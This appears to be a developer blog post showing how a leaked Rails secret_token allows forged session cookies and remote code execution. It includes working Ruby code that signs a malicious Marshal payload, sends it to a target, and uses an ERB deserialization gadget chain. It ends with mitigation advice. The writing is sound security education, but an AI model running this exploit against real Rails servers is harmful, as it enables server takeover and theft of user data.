---
layout: post
title: How to hack a Rails app using its secret_token
hn: 6110386
bestof: true
tags: [Security]
---

Create a new Rails app, open `/config/initializers/secret_token.rb` and you'll see your app's `secret_token`. As I will show you, if anyone who wishes you harm gets hold of this string then they can execute arbitrary code on your server. Troublingly, the Rails default includes it in your version control, and if you don't remove it then anyone who gets or is given access to your codebase has complete, complete control over your server. Maybe you added them to your private repo for a code review, or unthinkingly put a side-project production app into a public repo, or someone sneaked a look at your Sublime while you were out. It doesn't matter - if they have this key then they own you.

### Why your `secret_token` is important - session cookies

Your `secret_token` is used for verifying the integrity of your app's session cookies. A session cookie will look something like:

{% highlight ruby %}
_MyApp_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFRkkiJTcyZTAwMmRjZTg2NTBiZmI0M2UwZmY0MjEyNGJjODBhBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWhmYTBKSGQwYVQxRlhnTFZWK2FEZEVhbEtLbDBMSitoVEo5YU4zR2dxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b84ae0608956dfb5824689
{% endhighlight %}

The cookie value (the part after the `=`) is split into 2 parts, separated by `--`. The first part is a Base64 encoded serialization of the hash that Rails will use as the `session` variable in controllers. The second part is a signature created using `secret_token`, that Rails uses to check that the cookie it has been passed is legit. This prevents users from forging nefarious cookies and from tricking Rails into loading data it doesn't want to load. Unless of course they have your `secret_token` and can also forge the signature...

### The serialized session hash

The first part of the cookie is a Marshal dump of the session hash, encoded in Base64. Marshal is a Ruby object serialization format that is used here to allow Rails to persist objects between requests made in the same session. In many cases it will only store the `session_id`, `_csrf_token` and Warden authentication data, but calling `session["foo"] = "bar"` in your controllers allows you to store pretty much anything you want. For my cookie above, unescaping the URL encoding and then Base64 decoding gives:

{% highlight ruby %}
"\x04\b{\aI\"\x0Fsession_id\x06:\x06EFI\"%72e002dce8650bfb43e0ff42124bc80a\x06;\x00TI\"\x10_csrf_token\x06;\x00FI\"1hfa0JHd0aT1FXgLVV+aDdEalKKl0LJ+hTJ9aN3Ggq3s=\x06;\x00F"
{% endhighlight %}

which if you squint hard enough is indeed starting to look kind of like a hash. This cookie is passed up to the server with each request, Rails calls `Marshal.load` on it, and merrily populates `session` with whatever serialized objects it is passed. Object persistance between requests. Brilliant.

### The signature

But wait, the cookie obviously lives on the client side, which means that a user can set it to be anything they want. Which means that the user can pass in whatever serialized object they want to our app. And by the time we reinflate it and realise that they have passed us a small thermonuclear device, it will be too late and the attacker will be able to execute arbitrary code on our server.

That's where our `secret_token` and the second part of the cookie value (the part after the `--`) come in. Whenever Rails gets a session cookie, it checks that it hasn't been tampered with by verifying that the HMAC digest of the first part of the cookie with its `secret_token` matches the second, signature part. This means in order to craft a nefarious cookie an attacker would need to know the app's `secret_token`. Unfortunately, just being called `secret_token` doesn't make it secret, and, as already discussed, if you aren't careful then it can easily end up somewhere you don't want it to.

### The attack - how to bake a poisonous cookie

If you know an app's `secret_token` and want to forge a valid cookie, you simply need to reverse the above process:

{% highlight ruby %}
require "net/http"
require "uri"

secret_token = "stolen-from-github-or-somewhere"

# Construct your evil hash
my_evil_session_hash = {
    "ive_made_a_huge_mistake" => true
}

# Serialize your hash
marshal_dump = Marshal.dump(my_evil_session_hash)

# Base64 encode this dump
unescaped_cookie_value = Base64.encode64(marshal_dump)

# Escape any troublesome characters and remove line breaks altogether
escaped_cookie_value = CGI.escape(unescaped_cookie_value).gsub("%0A", "")

# Calculate the signature using the HMAC digest of the secret_token and the escaped cookie value. Replace %3D with equals signs.
cookie_signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret_token, escaped_cookie_value.gsub("%3D", "="))

# Construct your evil cookie by concatenating the value with the signature
my_evil_cookie = "_MyApp_session=#{unescaped_cookie_value}--#{cookie_signature}"

# BOMBS AWAY
url = URI.parse("http://myapp.com/") # Make sure you have a trailing / if you are sending to the root path

req = Net::HTTP::Get.new(url.path)
req.add_field("Cookie", my_evil_cookie)

res = Net::HTTP.new(url.host, url.port).start do |http|
    http.request(req)
end
{% endhighlight %}

This request will load `my_evil_session_hash` into `session`, which is purely on principal not good. But loading arbitrary strings and integers is not about to melt any servers. How can you choose the contents of your hash so as to actually do some damage? Some obscure objects buried deep inside Rails are happy to oblige:

{% highlight ruby %}   
# Thanks to the folks at CodeClimate for pointing this out

# The code in the ERB will run when Rails unserializes it
erb = ERB.allocate
erb.instance_variable_set :@src, "User.steal_all_passwords; User.email_spam_to_all_users;"

proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
my_evil_session_hash = {
    "proxy_of_death" => Marshal.dump(proxy)
}
# ... continue as above
{% endhighlight %}

And presto.

### Knowing is half the battle

ALL of this trouble can be trivially avoided by taking `secret_token` out of your version control. Put it into an environment variable (<a href="https://github.com/bkeepers/dotenv">dotenv</a> is handy for local, it's easy on <a href="https://devcenter.heroku.com/articles/config-vars">Heroku</a> too) and you can sleep (a bit more) soundly at night. If you suspect that someone you wouldn't want to meet on a dark night knows your `secret_token` then you can simply change it. All your existing cookies will be invalidated, but nothing else bad will happen. Of course, you still don't want anyone you don't trust to get any kind of access to your codebase at all. But you can at least make life difficult for them even if they do.

### Thanks to

<a href="http://railssecurity.com" target="_blank">Rails Security by Code Climate</a>
and
<a href="http://techbrahmana.blogspot.co.uk/2012/03/rails-cookie-handling-serialization-and.html" target="_blank">TechBrahmana</a>


